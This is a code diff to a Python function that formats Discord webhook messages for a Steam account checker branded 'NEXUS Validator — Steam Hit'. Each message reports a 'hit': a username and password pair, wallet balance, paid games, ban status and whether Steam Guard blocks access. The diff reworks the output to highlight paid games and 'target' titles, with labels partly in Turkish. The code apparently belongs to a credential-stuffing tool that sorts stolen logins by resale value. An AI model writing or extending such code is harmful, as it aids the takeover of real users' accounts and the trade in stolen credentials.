@@ -18,150 +18,172 @@ DEFAULT_STEAM_ICON = "https://community.cloudflare.steamstatic.com/public/shared
 
 def build_discord_embed(item: Dict[str, Any]) -> Dict[str, Any]:
     """
-    Constructs a rich, formatted Discord embed dictionary from a verified account record.
-    Complies with Discord embed size limits and syntax.
+    Constructs a rich, formatted Discord embed from a verified account record.
+    Shows ALL paid games, account value, and security status clearly.
     """
-    username = item.get("username", "Unknown")
-    password = item.get("password", "")
-    status = item.get("status", "HIT")
-    steamid = str(item.get("steamid", "")).strip()
-    persona = item.get("persona_name", username)
+    username  = item.get("username", "Unknown")
+    password  = item.get("password", "")
+    status    = item.get("status", "HIT")
+    steamid   = str(item.get("steamid", "")).strip()
+    persona   = item.get("persona_name", username) or username
     total_games = item.get("total_games", 0)
-    paid_games = item.get("paid_games", 0)
-    wallet = item.get("wallet", "")
-    country = item.get("country", "🌐 Global")
-    location = item.get("location", "")
+    paid_games  = item.get("paid_games", 0)
+    wallet    = item.get("wallet", "")
+    country   = item.get("country", "Global")
+    location  = item.get("location", "")
     vac_banned = item.get("vac_banned", False)
     trade_banned = item.get("trade_banned", False)
     is_limited = item.get("is_limited", False)
     avatar_url = item.get("avatar_url", "") or DEFAULT_STEAM_ICON
     games = item.get("games", [])
-
     matched_targets = item.get("matched_targets", [])
     is_2fa = (status == "2FA_HIT")
 
-    # Embed color: Vibrant Neon Green for Target Direct Hit, Emerald for regular, Amber for 2FA
+    # Separate paid and free games
+    paid_game_list = [
+        g for g in games
+        if not g.get("is_free", False) and g.get("name") and not g.get("name","").startswith("AppID ")
+    ]
+    free_game_list = [
+        g for g in games
+        if g.get("is_free", False) and g.get("name") and not g.get("name","").startswith("AppID ")
+    ]
+
+    # Color + title based on account type
     if matched_targets and not is_2fa:
-        color = 0x00FF66
-        title_prefix = "🎯 [TARGET HIT - DIRECT ACCESS]"
+        color = 0xFF0055   # Hot red for target hit
+        title_prefix = "[TARGET HIT]"
     elif is_2fa:
-        color = 0xFFAB00
-        title_prefix = "🛡️ [2FA GUARDED HIT]"
+        color = 0xFFAB00   # Amber for 2FA
+        title_prefix = "[2FA LOCKED]"
+    elif paid_game_list:
+        color = 0x00E676   # Emerald for paid hit
+        title_prefix = "[HIT - PAID GAMES]"
     else:
-        color = 0x00E676
-        title_prefix = "✅ [VALID DIRECT HIT]"
+        color = 0x00B0FF   # Blue for free/empty
+        title_prefix = "[HIT - FREE ONLY]"
 
-    title = f"{title_prefix} - {persona} ({username})"
-
-    profile_link = f"https://steamcommunity.com/profiles/{steamid}" if steamid else "N/A"
-
-    vac_str = "❌ BANNED" if vac_banned else "✅ CLEAN"
-    trade_str = "❌ BANNED" if trade_banned else "✅ CLEAN"
-    limited_str = "⚠️ LIMITED ($5 Rule)" if is_limited else "✅ UNRESTRICTED"
+    profile_link = f"https://steamcommunity.com/profiles/{steamid}" if steamid else None
+    title = f"{title_prefix}  {persona}"
 
     fields: List[Dict[str, Any]] = []
 
-    # Prominent Top Banner for High-Value Target Games
+    # ── Target games banner ──────────────────────────────────────────────────
     if matched_targets:
-        target_lines = []
-        for tg in matched_targets[:12]:
+        tlines = []
+        for tg in matched_targets[:15]:
             name = tg.get("name") if isinstance(tg, dict) else str(tg)
-            hours = tg.get("hours", "0") if isinstance(tg, dict) else "0"
-            h_str = f" ({hours} hrs)" if hours and str(hours) != "0" else ""
-            target_lines.append(f"⭐ **{name}**{h_str} `[PAID]`")
-        if len(matched_targets) > 12:
-            target_lines.append(f"*... +{len(matched_targets) - 12} more high-value targets!*")
-
+            hours = tg.get("hours","0") if isinstance(tg,dict) else "0"
+            h = f" ({hours}h)" if hours and str(hours) != "0" else ""
+            tlines.append(f"**{name}**{h}")
+        if len(matched_targets) > 15:
+            tlines.append(f"*+{len(matched_targets)-15} more...*")
         fields.append({
-            "name": f"🎯 HIGH-VALUE TARGET GAMES DETECTED ({len(matched_targets)})",
-            "value": "\n".join(target_lines),
+            "name": f"HEDEF OYUNLAR ({len(matched_targets)})",
+            "value": "\n".join(tlines) or "—",
             "inline": False
         })
 
-    fields.extend([
-        {
-            "name": "👤 Account Credentials",
-            "value": f"`{username}` : ||`{password}`||",
-            "inline": True
-        },
-        {
-            "name": "🆔 SteamID64",
-            "value": f"[{steamid}]({profile_link})" if steamid else "`N/A`",
-            "inline": True
-        },
-        {
-            "name": "💰 Wallet Balance",
-            "value": f"`{wallet}`" if wallet else "`$0.00 / None`",
-            "inline": True
-        },
-        {
-            "name": "🎮 Games Count",
-            "value": f"**{total_games}** Total (**{paid_games}** Paid)",
-            "inline": True
-        },
-        {
-            "name": "🌍 Geographic Region",
-            "value": f"{country}" + (f" ({location})" if location else ""),
-            "inline": True
-        },
-        {
-            "name": "🛡️ Security & Ban Status",
-            "value": f"VAC: **{vac_str}** | Trade: **{trade_str}**\nAccount: {limited_str}",
-            "inline": False
-        },
-    ])
+    # ── Account credentials ──────────────────────────────────────────────────
+    fields.append({
+        "name": "Hesap",
+        "value": f"`{username}` : ||`{password}`||",
+        "inline": True
+    })
 
-    # Detailed Games Breakdown Field
-    if games:
-        game_lines = []
-        for g in games[:12]:
-            g_name = g.get("name", "Unknown Game")
-            hours = g.get("hours", "0")
-            g_type = "Free" if g.get("is_free") else "Paid"
-            if hours and str(hours) != "0":
-                game_lines.append(f"• **{g_name}** ({hours} hrs) `[{g_type}]`")
-            else:
-                game_lines.append(f"• **{g_name}** `[{g_type}]`")
+    # SteamID
+    sid_val = f"[{steamid}]({profile_link})" if steamid and profile_link else (steamid or "N/A")
+    fields.append({"name": "SteamID", "value": sid_val, "inline": True})
 
-        remaining = len(games) - 12
-        if remaining > 0:
-            game_lines.append(f"*... and {remaining} more games in library.*")
+    # Wallet
+    fields.append({
+        "name": "Bakiye",
+        "value": f"`{wallet}`" if wallet else "`$0 / Yok`",
+        "inline": True
+    })
 
-        games_text = "\n".join(game_lines)
-        if len(games_text) > 1020:
-            games_text = games_text[:1015] + "..."
+    # Game count
+    fields.append({
+        "name": "Oyun Sayisi",
+        "value": f"**{total_games}** toplam | **{paid_games}** ucretli | **{len(free_game_list)}** ucretsiz",
+        "inline": True
+    })
 
+    # Country
+    loc = f" ({location})" if location else ""
+    fields.append({"name": "Ulke", "value": f"{country}{loc}", "inline": True})
+
+    # Security
+    vac_str   = "BANLI" if vac_banned   else "Temiz"
+    trade_str = "BANLI" if trade_banned else "Temiz"
+    limit_str = "Sinirli" if is_limited else "Normal"
+    fields.append({
+        "name": "Guvenlik",
+        "value": f"VAC: **{vac_str}** | Trade: **{trade_str}** | Hesap: {limit_str}",
+        "inline": True
+    })
+
+    # ── Paid games field (most important) ────────────────────────────────────
+    if paid_game_list:
+        plines = []
+        for g in paid_game_list[:20]:
+            nm = g.get("name","?")
+            h  = g.get("hours","0")
+            h_str = f" ({h}h)" if h and str(h) != "0" else ""
+            plines.append(f"• {nm}{h_str}")
+        if len(paid_game_list) > 20:
+            plines.append(f"*... ve {len(paid_game_list)-20} ucretli oyun daha*")
+        val = "\n".join(plines)
+        if len(val) > 1020:
+            val = val[:1015] + "..."
         fields.append({
-            "name": f"📜 Library Games Overview ({len(games)})",
-            "value": games_text,
+            "name": f"UCRETLI OYUNLAR ({len(paid_game_list)})",
+            "value": val,
+            "inline": False
+        })
+    elif is_2fa:
+        fields.append({
+            "name": "Oyunlar",
+            "value": "*(Steam Guard aktif - oyun listesi alinamadi)*",
             "inline": False
         })
     else:
         fields.append({
-            "name": "📜 Library Games Overview",
-            "value": "*(0 Games / Fresh Account - Credentials Verified & Active)*",
+            "name": "Oyunlar",
+            "value": "*(Ucretsiz hesap veya oyun yok)*",
+            "inline": False
+        })
+
+    # ── Free games (compact, max 10) ─────────────────────────────────────────
+    if free_game_list:
+        fnames = ", ".join(g.get("name","?") for g in free_game_list[:10])
+        if len(free_game_list) > 10:
+            fnames += f" +{len(free_game_list)-10} daha"
+        if len(fnames) > 1020:
+            fnames = fnames[:1015] + "..."
+        fields.append({
+            "name": f"Ucretsiz Oyunlar ({len(free_game_list)})",
+            "value": fnames,
             "inline": False
         })
 
     embed = {
         "title": title,
-        "url": profile_link if steamid else None,
         "color": color,
         "fields": fields,
-        "thumbnail": {
-            "url": avatar_url
-        },
+        "thumbnail": {"url": avatar_url},
         "footer": {
-            "text": "NEXUS Platform Authentication State Validator • Automated Cloud Dispatch",
+            "text": "NEXUS Validator — Steam Hit",
             "icon_url": DEFAULT_STEAM_ICON
         },
         "timestamp": datetime.utcnow().isoformat() + "Z"
     }
-
-    if embed["url"] is None:
-        del embed["url"]
+    if profile_link:
+        embed["url"] = profile_link
 
     return embed
+
+
 
 
 class DiscordWebhookDispatcher:
